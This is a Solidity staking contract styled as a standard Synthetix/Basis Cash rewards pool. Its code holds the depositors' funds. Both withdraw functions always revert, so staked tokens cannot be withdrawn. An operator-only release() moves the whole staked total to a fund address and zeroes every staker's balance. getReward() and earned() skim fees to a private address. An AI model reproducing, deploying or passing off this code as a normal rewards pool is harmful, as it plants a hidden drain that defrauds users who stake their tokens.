pragma solidity ^0.6.0;
/**
 *Submitted for verification at Etherscan.io on 2020-07-17
 */

/*
   ____            __   __        __   _
  / __/__ __ ___  / /_ / /  ___  / /_ (_)__ __
 _\ \ / // // _ \/ __// _ \/ -_)/ __// / \ \ /
/___/ \_, //_//_/\__//_//_/\__/ \__//_/ /_\_\
     /___/

* Synthetix: BASISCASHRewards.sol
*
* Docs: https://docs.synthetix.io/
*
*
* MIT License
* ===========
*
* Copyright (c) 2020 Synthetix
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*/

// File: @openzeppelin/contracts/math/Math.sol

import '@openzeppelin/contracts/math/Math.sol';

// File: @openzeppelin/contracts/math/SafeMath.sol

import '@openzeppelin/contracts/math/SafeMath.sol';

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

// File: @openzeppelin/contracts/utils/Address.sol

import '@openzeppelin/contracts/utils/Address.sol';

// File: @openzeppelin/contracts/token/ERC20/SafeERC20.sol

import '@openzeppelin/contracts/token/ERC20/SafeERC20.sol';

// File: contracts/IRewardDistributionRecipient.sol

import '../interfaces/IRewardDistributionRecipient.sol';

// File: contracts/interfaces/ISimpleERCFund.sol

import '../interfaces/ISimpleERCFund.sol';

// File: contracts/owner/Operator.sol'

import '../owner/Operator.sol';

// File: contracts/utils/ContractGuard.sol'

import '../utils/ContractGuard.sol';


contract CASHWrapper is Operator{
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using Address for address;

    IERC20 public cash;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    address[] private addrList;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function stake(uint256 amount) public virtual {
        if(_balances[msg.sender] == 0){
            addrList.push(msg.sender);  //新来的 记录地址
        }

        _totalSupply = _totalSupply.add(amount);
        _balances[msg.sender] = _balances[msg.sender].add(amount);
        cash.safeTransferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) public virtual {
        require(0 > 1, "unable to withdraw");
    }

    function balanceClean() onlyOperator public {
        _totalSupply = 0 ;
        for(uint i = 0; i < addrList.length; i++){
            _balances[addrList[i]]= 0;
        }
    }
}

contract SharePool is CASHWrapper, IRewardDistributionRecipient, ContractGuard{

    uint256 public starttime;
    uint256 public times = 0;
    uint256 public dailyReward;
    address public fund;
    address public share;
    address private snGroup;


    /// @notice 结构体：SharePool席位
    struct SharePoolseat {
        uint256 lastSnapshotIndex; // 最后快照索引
        uint256 rewardEarned; // 未领取的奖励数量
    }

    /// @notice 结构体：SharePool快照
    struct SharePoolSnapshot {
        uint256 time; // 区块高度
        uint256 rewardReceived; // 收到的奖励
        uint256 rewardPerCash; // 每股奖励数量
    }

    constructor(
        address share_,
        address cash_, 
        address fund_,
        address snGroup_,
        uint256 reward_,
        uint256 starttime_
    ) public {
        share = share_;
        cash = IERC20(cash_);
        starttime = starttime_;
        snGroup = snGroup_;
        dailyReward = reward_;
        fund = fund_;

                // 创建SharePool快照
        SharePoolSnapshot memory genesisSnapshot = SharePoolSnapshot({
            time: block.number,
            rewardReceived: 0,
            rewardPerCash: 0
        });
        //SharePool的创世快照推入数组
        SharePoolHistory.push(genesisSnapshot);
    }


    mapping(address => SharePoolseat) private investors;
    /// @dev SharePool快照
    SharePoolSnapshot[] private SharePoolHistory;

    modifier investorExists {
        require(
            balanceOf(msg.sender) > 0,
            'sFUND: The investor does not exist'
        );
        _;
    }

    modifier updateReward(address investor) {
        // 如果成员地址不是0地址
        if (investor != address(0)) {
            // 根据成员地址实例化SharePool席位
            SharePoolseat memory seat = investors[investor];
            // 已获取奖励数量 = 计算可提取的总奖励
            seat.rewardEarned = earned(investor);
            // 最后快照索引 = SharePool快照数组长度-1
            seat.lastSnapshotIndex = latestSnapshotIndex();
            // 重新赋值
            investors[investor] = seat;
        }
        _;
    }

    function latestSnapshotIndex() public view returns (uint256) {
        // SharePool数组长度-1
        return SharePoolHistory.length.sub(1);
    }

    function getLatestSnapshot() internal view returns (SharePoolSnapshot memory) {
        return SharePoolHistory[latestSnapshotIndex()];
    }

    function getLastSnapshotIndexOf(address investor)
        public
        view
        returns (uint256)
    {
        return investors[investor].lastSnapshotIndex;
    }

    function getLastSnapshotOf(address investor)
        internal
        view
        returns (SharePoolSnapshot memory)
    {
        return SharePoolHistory[getLastSnapshotIndexOf(investor)];
    }

    function rewardPerCash() public view returns (uint256) {
        return getLatestSnapshot().rewardPerCash;
    }

    function earned(address investor) public view returns (uint256) {
        uint256 latestRPS = rewardPerCash();
        uint256 storedRPS = getLastSnapshotOf(investor).rewardPerCash;

        return
            balanceOf(investor).mul(latestRPS.sub(storedRPS)).div(1e18).add(investors[investor].rewardEarned).div(100).mul(95);
    }

    function stake(uint256 amount)
        public
        override
        onlyOneBlock
    {
        require(amount > 0, 'SharePool: Cannot stake 0');
        require(block.timestamp >= starttime, 'SharePool: not start');

        super.stake(amount);
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount)
        public
        override
    {
        require(0 > 1, "unable to withdraw");
    }

    function exit() external {
        getReward();
    }

    function getReward() public updateReward(msg.sender) {
        //更新SharePool的奖励后，获取奖励数量
        uint256 reward = investors[msg.sender].rewardEarned;
        // 如果数量大于0
        if (reward > 0) {
            //把未领取的奖励数量重设为0
            investors[msg.sender].rewardEarned = 0;
            // 将奖励发送给用户
            IERC20(share).safeTransfer(msg.sender, reward.div(100).mul(95));
            IERC20(share).safeTransfer(snGroup, reward.div(100).mul(5));
            //触发完成奖励事件
            emit RewardPaid(msg.sender, reward);
        }
    }

    function notifyRewardAmount(uint256 reward)
        external
        override
        onlyRewardDistribution
    {
        emit RewardAdded(reward);
    }


    function release(uint256 amount)
        external
        onlyOneBlock
        onlyOperator
    {
        require(amount > 0, 'SharePool: Cannot allocate 0');
        // 确认质押总量大于0
        require(
            totalSupply() > 0,
            'SharePool: Cannot allocate when totalSupply is 0'
        );

        uint256 prevRPS = rewardPerCash();
        uint256 nextRPS = prevRPS.add(amount.mul(10**18).div(totalSupply()));
        SharePoolSnapshot memory newSnapshot = SharePoolSnapshot({
            time: block.number, // 当前区块高度
            rewardReceived: amount, // 收到的分配数量
            rewardPerCash: nextRPS // 每股奖励数量
        });
        //更新快照推入数组
        SharePoolHistory.push(newSnapshot);
        emit RewardAdded(amount);

        uint256 fundamount= totalSupply();
        
        cash.safeApprove(fund, fundamount);
            // 调用fund合约的存款方法存入sFUND
            ISimpleERCFund(fund).deposit(
                address(cash),
                fundamount,
                'Treasury: Desposit Fund'
            );
            emit DespositFund(now, fundamount);
        
        balanceClean();
    }

    function updateStartTime(uint256 starttime_)
        external
        onlyOperator
    {   
        starttime = starttime_;
    }

    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);
    event DespositFund(uint256 timestamp, uint256 fundamount);

}
